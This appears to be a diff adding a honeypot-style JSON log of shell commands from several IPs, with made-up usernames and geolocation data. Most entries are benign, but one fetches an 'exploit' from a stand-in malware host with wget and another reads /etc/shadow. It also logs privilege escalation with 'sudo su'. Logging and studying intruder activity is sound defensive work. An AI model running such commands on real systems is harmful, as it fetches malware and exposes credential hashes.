@@ -1,0 +1,32 @@
+{"timestamp": "2025-03-02T17:37:05.111581", "ip": "88.191.219.56", "command": "cd home", "geo": {"country": "France", "isp": "OVH"}, "cwd": "/home/user", "user": "ghostA"}
+{"timestamp": "2025-03-02T17:37:18.347550", "ip": "88.191.219.56", "command": "ls", "geo": {"country": "France", "isp": "OVH"}, "cwd": "/home/user", "user": "ghostA"}
+{"timestamp": "2025-03-02T17:37:20.755225", "ip": "88.191.219.56", "command": "exit", "geo": {"country": "France", "isp": "OVH"}, "cwd": "/home/user", "user": "ghostA"}
+{"timestamp": "2025-03-02T17:52:33.958043", "ip": "101.226.103.42", "command": "cd var", "geo": {"country": "China", "isp": "China Telecom"}, "cwd": "/home/user", "user": "ghostB"}
+{"timestamp": "2025-03-02T17:52:49.341302", "ip": "101.226.103.42", "command": "cd tmp", "geo": {"country": "China", "isp": "China Telecom"}, "cwd": "/home/user", "user": "ghostB"}
+{"timestamp": "2025-03-02T17:52:54.256616", "ip": "101.226.103.42", "command": "ls", "geo": {"country": "China", "isp": "China Telecom"}, "cwd": "/home/user", "user": "ghostB"}
+{"timestamp": "2025-03-02T18:06:30.864469", "ip": "81.19.67.93", "command": "ls", "geo": {"country": "Russia", "isp": "Rostelecom"}, "cwd": "/home/user", "user": "ghostC"}
+{"timestamp": "2025-03-02T18:06:53.393426", "ip": "81.19.67.93", "command": "lscsudo", "geo": {"country": "Russia", "isp": "Rostelecom"}, "cwd": "/home/user", "user": "ghostC"}
+{"timestamp": "2025-03-02T18:07:12.526626", "ip": "81.19.67.93", "command": "exit", "geo": {"country": "Russia", "isp": "Rostelecom"}, "cwd": "/home/user", "user": "ghostC"}
+{"timestamp": "2025-03-02T18:09:42.931145", "ip": "81.19.67.93", "command": "sudo su", "geo": {"country": "Russia", "isp": "Rostelecom"}, "cwd": "/home", "user": "ghostD"}
+{"timestamp": "2025-03-02T18:10:15.763215", "ip": "81.19.67.93", "command": "exit", "geo": {"country": "Russia", "isp": "Rostelecom"}, "cwd": "/", "user": "ghostD"}
+{"timestamp": "2025-03-02T18:16:08.705313", "ip": "190.216.21.44", "command": "cd Documents", "geo": {"country": "Argentina", "isp": "Telecom Argentina"}, "cwd": "/home/user", "user": "ghostE"}
+{"timestamp": "2025-03-02T18:21:12.074731", "ip": "190.216.21.44", "command": "cat todo.txt", "geo": {"country": "Argentina", "isp": "Telecom Argentina"}, "cwd": "/home/user/Documents", "user": "ghostE"}
+{"timestamp": "2025-03-02T18:17:14.905788", "ip": "190.216.21.44", "command": "cd Dcuments", "geo": {"country": "Argentina", "isp": "Telecom Argentina"}, "cwd": "/home/user", "user": "ghostF"}
+{"timestamp": "2025-03-02T18:17:39.810212", "ip": "190.216.21.44", "command": "exit", "geo": {"country": "Argentina", "isp": "Telecom Argentina"}, "cwd": "/home/user", "user": "ghostF"}
+{"timestamp": "2025-03-02T18:20:58.093726", "ip": "101.226.103.42", "command": "wget http://malware.com/exploit", "geo": {"country": "China", "isp": "China Telecom"}, "cwd": "/tmp", "user": "ghostG"}
+{"timestamp": "2025-03-02T20:16:23.628877", "ip": "88.191.219.56", "command": "cat shadow", "geo": {"country": "France", "isp": "OVH"}, "cwd": "/etc", "user": "ghostH"}
+{"timestamp": "2025-03-03T08:00:32.723909", "ip": "190.216.21.44", "command": "ps aux", "geo": {"country": "Argentina", "isp": "Telecom Argentina"}, "cwd": "/", "user": "enigmaK"}
+{"timestamp": "2025-03-03T09:02:33.989044", "ip": "103.21.244.0", "command": "cd /root", "geo": {"country": "India", "isp": "Airtel"}, "cwd": "/", "user": "ghostI"}
+{"timestamp": "2025-03-03T10:10:38.574185", "ip": "103.21.244.0", "command": "touch secret_stuff", "geo": {"country": "India", "isp": "Airtel"}, "cwd": "/home/admin", "user": "spectreQ"}
+{"timestamp": "2025-03-03T12:20:57.623174", "ip": "101.226.103.42", "command": "cat flag.txt", "geo": {"country": "China", "isp": "China Telecom"}, "cwd": "/root", "user": "obscuraM"}
+{"timestamp": "2025-03-03T14:30:24.492758", "ip": "88.191.219.56", "command": "whoami", "geo": {"country": "France", "isp": "OVH"}, "cwd": "/home/user", "user": "veilN"}
+{"timestamp": "2025-03-04T07:45:56.445130", "ip": "81.19.67.93", "command": "cd /etc", "geo": {"country": "Russia", "isp": "Rostelecom"}, "cwd": "/", "user": "maskD"}
+{"timestamp": "2025-03-04T10:17:18.026680", "ip": "190.216.21.44", "command": "ls -la", "geo": {"country": "Argentina", "isp": "Telecom Argentina"}, "cwd": "/root", "user": "cipherF"}
+{"timestamp": "2025-03-04T15:22:27.259424", "ip": "103.21.244.0", "command": "exit", "geo": {"country": "India", "isp": "Airtel"}, "cwd": "/etc", "user": "enigmaP"}
+{"timestamp": "2025-03-05T10:51:54.235412", "ip": "81.19.67.93", "command": "sudo su", "geo": {"country": "Russia", "isp": "Rostelecom"}, "cwd": "/home/user", "user": "ghostJ"}
+{"timestamp": "2025-03-05T10:59:19.998526", "ip": "81.19.67.93", "command": "exit", "geo": {"country": "Russia", "isp": "Rostelecom"}, "cwd": "/home/user", "user": "ghostJ"}
+{"timestamp": "2025-03-05T11:05:22.154414", "ip": "190.216.21.44", "command": "cat to.txt", "geo": {"country": "Argentina", "isp": "Telecom Argentina"}, "cwd": "/home/user/Documents", "user": "ghostL"}
+{"timestamp": "2025-03-05T11:10:50.435137", "ip": "88.191.219.56", "command": "cd Downloads", "geo": {"country": "France", "isp": "OVH"}, "cwd": "/home/user", "user": "ghostM"}
+{"timestamp": "2025-03-05T11:17:26.784871", "ip": "103.21.244.0", "command": "ms", "geo": {"country": "India", "isp": "Airtel"}, "cwd": "/home", "user": "ghostN"}
+{"timestamp": "2025-03-05T11:24:28.617879", "ip": "81.19.67.93", "command": "quit", "geo": {"country": "Russia", "isp": "Rostelecom"}, "cwd": "/home/admin", "user": "ghostO"}
+{"timestamp": "2025-03-05T11:31:39.245144", "ip": "101.226.103.42", "command": "\u0003exit", "geo": {"country": "China", "isp": "China Telecom"}, "cwd": "/home/user", "user": "ghostP"}
